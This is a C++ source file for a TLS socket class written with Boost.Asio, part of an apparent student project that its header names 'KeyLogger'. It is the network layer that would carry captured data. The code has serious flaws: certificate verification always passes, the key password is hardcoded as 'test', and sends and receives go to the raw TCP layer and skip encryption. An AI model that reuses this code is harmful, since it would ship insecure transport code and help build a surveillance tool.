/*
** TcpBoostSslSocket.cpp for KeyLogger in /home/guillaume/delivery/KeyLogger/TcpBoostSslSocket.cpp
**
** Made by Guillaume Julien
** Login   <guillaume.julien@epitech.eu>
**
** Started on  Thu Nov 02 15:28:38 2017 Guillaume Julien
** Last update Thu Nov 02 15:28:38 2017 Guillaume Julien
*/

#include <boost/array.hpp>
#include <boost/bind.hpp>
#include <iostream>
#include <fstream>
#include "TcpBoostSslSocket.hh"

bl::network::socket::TcpBoostSslSocket::TcpBoostSslSocket(bool isClient) : m_isClient(isClient) {
	if (!isClient) {
		try {
			m_sslCtx.set_options(
					boost::asio::ssl::context::default_workarounds
					| boost::asio::ssl::context::no_sslv2
					| boost::asio::ssl::context::single_dh_use);
			m_sslCtx.set_password_callback(boost::bind(&TcpBoostSslSocket::getPassword, this));
			m_sslCtx.use_certificate_chain_file("./.certificate/server.pem");
			m_sslCtx.use_private_key_file("./.certificate/server.pem", boost::asio::ssl::context::pem);
			m_sslCtx.use_tmp_dh_file("./.certificate/dh2048.pem");
		} catch (...) {
			m_isClient = true;
		}
	}
	m_socket = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(m_ios, m_sslCtx);
}

bool bl::network::socket::TcpBoostSslSocket::connect(std::string const &address, unsigned short port) {
	m_socket->set_verify_mode(boost::asio::ssl::verify_peer);
	m_socket->set_verify_callback(boost::bind(&TcpBoostSslSocket::verify_certificate, this, _1, _2));
	m_socket->lowest_layer().connect(
			boost::asio::ip::tcp::endpoint(boost::asio::ip::address::from_string(address), port));
	m_socket->handshake(boost::asio::ssl::stream<boost::asio::ip::tcp::socket>::client);
	return (m_connected = m_socket->lowest_layer().is_open());
}

bool bl::network::socket::TcpBoostSslSocket::verify_certificate(bool,
                                                            boost::asio::ssl::verify_context &ctx) {
	char subject_name[256];
	X509 *cert = X509_STORE_CTX_get_current_cert(ctx.native_handle());
	X509_NAME_oneline(X509_get_subject_name(cert), subject_name, 256);

	return true;
}

void bl::network::socket::TcpBoostSslSocket::send(char const *msg) {
	m_socket->next_layer().send(boost::asio::buffer("#$BL-->" + std::string(msg) + "\r\n"));
}

void bl::network::socket::TcpBoostSslSocket::send(std::string const &msg) {
	m_socket->next_layer().send(boost::asio::buffer("#$BL-->" + msg + "\r\n"));
}

char *bl::network::socket::TcpBoostSslSocket::receive(char *buf, size_t bufSize) {
	return buf;
}

std::string bl::network::socket::TcpBoostSslSocket::receive() {
	boost::array<char, m_bufferSize> recv_buf{};
	boost::asio::ip::udp::endpoint sender_endpoint;
	m_socket->next_layer().receive(boost::asio::buffer(recv_buf));
	auto msg = std::string(recv_buf.begin(), recv_buf.end());
	return msg;
}

boost::asio::ip::tcp::socket &bl::network::socket::TcpBoostSslSocket::getBoostSocket() {
	return this->m_socket->next_layer();
}

std::shared_ptr<bl::network::socket::ISocket> bl::network::socket::TcpBoostSslSocket::clone() const {
	std::shared_ptr<ISocket> ret(new TcpBoostSslSocket(m_isClient));
	ret->setAutoDataDecrypt(m_autoDecrypt);
	ret->setAutoDataEncrypt(m_autoEncrypt);
	return ret;
}

std::string bl::network::socket::TcpBoostSslSocket::getPassword() const {
	return "test";
}

void bl::network::socket::TcpBoostSslSocket::handshake() {
	m_socket->handshake(boost::asio::ssl::stream<boost::asio::ip::tcp::socket>::server);
}

void bl::network::socket::TcpBoostSslSocket::setAutoDataEncrypt(bool encrypt) {
	m_autoEncrypt = encrypt;
}

void bl::network::socket::TcpBoostSslSocket::setAutoDataDecrypt(bool decrypt) {
	m_autoDecrypt = decrypt;
}

bool bl::network::socket::TcpBoostSslSocket::openConnection(unsigned short) {
	std::cerr << "Can't open connection like that" << std::endl;
	return false;
}

void bl::network::socket::TcpBoostSslSocket::close() {
	this->m_socket->lowest_layer().close();
}

void bl::network::socket::TcpBoostSslSocket::send(std::vector<char> const &msg) {
	std::cerr << "Nep" << std::endl;
}

void bl::network::socket::TcpBoostSslSocket::receive(std::vector<char> &buf) {
	std::cerr << "Nop" << std::endl;
}

boost::asio::ip::tcp::endpoint bl::network::socket::TcpBoostSslSocket::getRemoteEndpoint() {
	return this->m_socket->lowest_layer().remote_endpoint();
}

